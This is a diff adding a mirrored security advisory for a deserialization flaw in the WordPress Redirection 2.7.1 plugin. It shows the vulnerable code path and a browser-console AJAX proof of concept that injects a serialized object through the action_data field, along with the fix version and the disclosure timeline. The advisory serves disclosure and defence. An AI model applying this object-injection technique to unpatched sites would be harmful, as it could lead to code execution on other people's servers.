@@ -1,0 +1,108 @@
+id: 30586
+date: 06/15/2018
+title: WordPress Redirection 2.7.1 Deserialization Code Execution Vulnerability
+author: Glyn Wintle
+cves: 
+
+Details
+================
+Software: Redirection
+Version: 2.7.1
+Homepage: https://wordpress.org/plugins/redirection/
+Advisory report: https://advisories.dxw.com/advisories/unserialization-redirection/
+CVE: Awaiting assignment
+CVSS: 9 (High; AV:N/AC:L/Au:S/C:C/I:C/A:C)
+
+Description
+================
+Unserialization vulnerability in Redirection could allow admin to execute arbitrary code in some circumstances
+
+Vulnerability
+================
+It is possible for a user with the administrator privilege to submit a string that contains an encoded object that executes arbitrary code of the attackeras choosing.
+The value can be passed in with an AJAX request to admin-ajax.php using the red_ajax_set_redirect action that is passed to the ajax_set_redirect method in this code:
+public function ajax_set_redirect( $params ) { 
+  $params = $this->get_params( $params ); 
+  ....
+  $result = $redirect->update( $params );
+}
+
+private function get_params( $params ) { 
+  if ( empty( $params ) ) {
+    $params = $_POST; 
+  }
+  return $params; 
+}
+
+The update method then passes the attack string to this code:
+class Red_Item {
+  public function update( $details ) {
+    $data = $sanitizer->get( $details );
+    $this->load_from_data( (object) $data );
+  }
+
+  private function load_from_data( stdClass $values ) {
+    foreach ( $values as $key => $value ) {
+    $this->$key = $value; }
+  }
+The sanitizer does not sanitize the action_data value. Many calls to this class then use its to_json method, which is as follows:
+  public function get_action_data() {
+    return $this->action_data ? $this->action_data : \'\';
+  }
+
+  public function to_json() {
+    maybe_unserialize( $this->get_action_data() ),
+  } 
+
+The sum effect is therefore that unsanitized user input is being passed to maybe_unserialize().
+
+
+Proof of concept
+================
+Achieving arbitrary code execution depends on which classes are available (i.e. which plugins and themes are installed and active). It may not be possible in all situations. As such, this PoC will merely attempt to show that an arbitrary string can be passed to the maybe_unserialize() function.
+
+Visit /wp-admin/tools.php?page=redirection.php
+Create a new redirect with a/booa, ahttps://www.dxw.com/a, and aRedirectionsa.
+Weall assume this redirect was given ID of 1 in the wp_redirection_items table. If that isnat true, change the aida value in the provided JavaScript.
+Then, without leaving the page, open your browseras console and execute this JavaScript:
+jQuery.ajax(ajaxurl,{
+ method: \'POST\',
+ data: {
+ \'action\': \'red_set_redirect\',
+ \'_wpnonce\': window.Redirectioni10n.WP_API_nonce,
+ \'id\': \'1\',
+ \'match_type\': \'url\',
+ \'action_code\': \'1\',
+ \'action_type\': \'url\',
+ \'url\': \'https://www.dxw.com/\',
+ \'group_id\': \'1\',
+ \'action_data\': \'O:8:\"stdClass\":1:{s:5:\"hello\";s:5:\"world\";}\',
+ },
+}).done(console.log)
+Then, by inspecting the JavaScript object printed by console.log, or by looking at the Network logs, youall notice that we have a {ahelloa: aworlda} JavaScript object showing that our arbitrary string was passed to unserialize() and therefore, if the correct classes were available, we would be able to turn this into arbitrary code execution.
+
+Mitigations
+================
+Upgrade to version 2.8 or later.
+
+Disclosure policy
+================
+dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://advisories.dxw.com/disclosure/
+
+Please contact us on security@dxw.com to acknowledge this report if you received it via a third party (for example, plugins@wordpress.org) as they generally cannot communicate with us on your behalf.
+
+This vulnerability will be published if we do not receive a response to this report with 14 days.
+
+Timeline
+================
+
+2017-10-02: Discovered
+2017-10-03: Reported via website contact form
+2017-10-04: Response received. Author has asked for PoC: aThe value for action_data is sanitised when it is passed through Red_Item_Sanitizea
+2017-10-09: Developed a PoC
+2017-10-10: Working PoC provided to author.
+2017-10-18: Author reported fixed in 2.8
+2018-06-06: Advisory published
+2018-06-12: CVE requested
+
+#  0day.today [2023-03-27]  #
